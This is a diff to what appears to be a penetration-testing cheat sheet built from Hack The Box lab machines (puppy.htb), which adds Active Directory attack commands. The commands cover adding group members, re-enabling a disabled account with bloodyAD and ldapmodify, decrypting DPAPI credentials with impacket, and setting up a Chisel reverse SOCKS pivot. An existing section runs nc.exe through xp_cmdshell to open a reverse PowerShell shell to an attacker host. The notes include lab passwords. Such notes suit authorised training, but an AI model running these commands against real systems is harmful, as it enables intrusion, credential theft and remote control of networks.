@@ -913,6 +913,28 @@ KRB5CCNAME=user.ccache GetADUsers.py -all -dc-ip <DC_IP> \
     -k -no-pass 'domain.com/user'
 ```
 
+## <mark style="color:red;">ADD AND SEE MEMBER GROUP</mark>
+
+```
+net rpc group addmem developers levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb 
+net rpc group members developers -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb 
+```
+
+***
+
+## <mark style="color:red;">ENABLE DISABLED ACCOUNT</mark>
+
+```
+oxdf@hacky$ bloodyAD -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -d puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
+
+ldapmodify -x -H ldap://10.10.11.70 -D 'ant.edwards@puppy.htb' -w 'Antman2025!' <<EOF
+dn: CN=Adam D. Silver,CN=Users,DC=puppy,DC=htb
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+EOF
+```
+
 ***
 
 ## <mark style="color:red;">Certificate Requests</mark>
@@ -1076,7 +1098,7 @@ cat ldd/domain_users.grep | cut -f 3 | grep -vE 'rose|sAMA' > users.txt
 
 ***
 
-## MSSQL Reverse Shell via SMB share
+## <mark style="color:red;">MSSQL Reverse Shell via SMB share</mark>
 
 ```
 
@@ -1096,3 +1118,50 @@ SQL (sa dbo@master)> xp_cmdshell net use Z: \\10.10.14.38\evilshare /user:evil e
 SQL (sa  dbo@master)> xp_cmdshell Z:\nc.exe 10.10.14.38 443 -e powershell.exe
 
 ```
+
+***
+
+## <mark style="color:red;">DPAPI EXPLOIT</mark>
+
+{% code fullWidth="true" %}
+```
+ impacket-dpapi masterkey -file masterkey -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+```
+{% endcode %}
+
+```
+ impacket-dpapi credential -file cred1 -key <previous key>
+```
+
+***
+
+## <mark style="color:red;">Chisel Port Forwarding</mark>
+
+[Port Forwarding with C... | 0xBEN | NotesUsage Requires a copy of the Chisel binary on: The target host The attacker’s host Download fr…0xBEN | Notes](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel?ref=benheater.com#bkmrk-reverse-dynamic-sock)
+
+```bash
+sudo ./chisel server --port 8081 --reverse &
+```
+
+```powershell
+$sb = { C:\Users\winrm_svc\Documents\chisel.exe client 10.10.14.164:8081 R:58080:socks }
+```
+
+```powershell
+Start-Job -ScriptBlock $sb
+```
+
+Define a scriptblock and start the `chisel` client in the background
+
+<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>
+
+Reverse dynamic SOCKS proxy has been established
+
+```ini
+[ProxyList]
+socks5 127.0.0.1 58080
+```
+
+Ensure this entry is in `/etc/proxychains4.conf`
